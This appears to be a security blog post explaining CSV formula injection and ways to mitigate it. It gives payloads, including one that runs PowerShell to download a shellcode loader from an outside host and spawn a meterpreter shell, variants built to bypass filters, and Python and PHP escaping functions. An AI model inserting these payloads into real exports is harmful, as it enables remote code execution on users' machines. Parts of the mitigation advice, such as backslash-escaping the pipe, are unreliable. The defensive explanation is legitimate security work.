# CSV Injection Revisited - Making Things More Dangerous(and fun)
In this post, I will discuss several methods and remediation steps that can be used to help escape and mitigate [CSV](https://support.office.com/en-gb/article/Import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba) (Comma separated values) injection type attacks. 

For those of you who may not know what CSV injection is or how it occurs, here is a short explanation, followed by remediation steps and points of interest.
######Introduction
CSV Injection is an attack technique first discovered by Context Information Security in [2014](http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/). Usually, an attacker can exploit this functionality by inserting arbitrary characters into forms that are exportable(be this via analytics, contacts or other functionality). Consequently enabling said attacker to formulate an attack payload that is executed when said CSV file is downloaded. 

The attack scenario for this is purely targeting the user(s) who download the CSV file, naturally this attack is usually disregarded as a non-issue however websites should still be aware of information that they are exporting can be potentially harmful to users.

The most common payload seen and used tends to look similar to that shown below:

    =cmd|' /C calc'!A0

This string in its core, is essentially telling the program that it is opened with that it would like to execute `cmd.exe` with the following flags `/C calc` which in turn will launch `calc.exe` from the command line. 

Naturally this can be further exploited to craft more complex payloads, my good friend [xpnsec](https://twitter.com/_xpn_) [demonstrated](https://xpnsec.tumblr.com/post/133298850231/from-csv-to-meterpreter) late last year how it is possible to craft a metasploit payload via this attack technique. To formulate a [meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) payload on the victim, I adapted his payload string to make it shorter and easier to inject as a result, the following payload can be used:

    =cmd|' /C powershell IEX(wget 0r.pe/p)'!A0

Where in this case the shortened domain `0r.pe` is used to deliver the payload ([Invoke-Shellcode](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1)) which is a function of [Powersploit](https://github.com/PowerShellMafia/PowerSploit) to enable spawning of meterpreter shells. These payloads are all fine and well however more often than not I've been seeing the `=` character being filtered out. 

However using personal Microsoft Excel knowledge, it is also possible to intact the payload using other character combinations such as  `@`, `+` or `-` in a variety of different combinations. My current payload of choice for exploiting this as a proof of concept is.

    @SUM(1+1)*cmd|' /C calc'!A0 

OR for quantifying the danger:
     
    @SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0

Having said all this and talked about the various payloads, there are mitigation steps that can be taken to more or less remove the threat of unwanted powershell scripts executing and infesting a user's system with shells. 

######Mitigation Steps
The recommended steps to remediate this issue described above would be to ensure that forms that can be exported contain only alpha-numeric characters and cannot be modified to add arbitrary characters. 

It should also be considered that all user input be not trusted and as a result any output should be encoded. The output from this functionality should be assumed as text and not formulae thus steps could be taken to easily designate it as such by placing quotes around the text or applying escape features as described and demonstrated below.

The issue with the CSV injection vectors discussed above isn't actually to do with the `@` character, or `=`, `+`, `-`. The problem lies with the pipe (`|`) character, which Excel and other applications interpret to execute {arbitrary} commands and launch windows binaries from these payload vectors. From reading about attacks and researching into possible mitigation techniques, I've found that the best workaround is to escape the pipe character in this attack scenario is to prepend a `\` before the pipe.This is due to excel and other programs looking for an executable named `cmd.exe` or `powershell.exe` however when adding a `\` into the path will prevent the exe from launching hence escaping and fixing this particular issue.

Additionally I have also written a python script to escape CSV files which can be seen below, it's a quick and dirty proof of concept however can be adapted easily:

    def escape(payload):
         if payload[0] in ('@','+','-', '=', '|'):
                 payload = payload.replace("|", "\|")
                 payload = "'" + payload + "'"
         return payload

    # An example of payload string
    payload = "@cmd|' /C calc'!A0"
    print "The Unescaped version is: " +  payload
    print "When passed though escape function the value is: " + escape(payload)

From the code above it can be seen that if a payload string contains any of the blacklisted characters the attack is escaped, this is demonstrated in the output from the script:

    root@zsec:# python escape_csv.py
    The Unescaped version is: "@cmd|' /C calc'!A0"
    When passed though escape function the value is: '@cmd\|' /C calc'!A0'

Notice from the output it can be seen that the escaped version has a set of `'` around the user string and the pipe character has also been escaped. It should be noted that the issues described above are only one type of CSV injection attack, this mitigation does not cover information theft attacks that can be carried out using same technique but different payloads. 

**Update**: *Additionally I have re-wrote the mitigation in PHP, again it is quick and dirty, it is likely that there are better ways to code this but here be monsters:*

      public static function escape_csv( $payload ) {
		$triggers = array( '=', '+', '-', '@', '|' );

		if ( in_array( mb_substr( $payload, 0, 1 ), $triggers, true ) ) {
			$payload = "'" . $payload . "'";
		}

		return $payload;
	}

I hope that this post has given some of you a greater insight into how CSV injection works and how to better mitigate the issue. If you want more information feel free to [tweet me](https://twitter.com/ZephrFish)


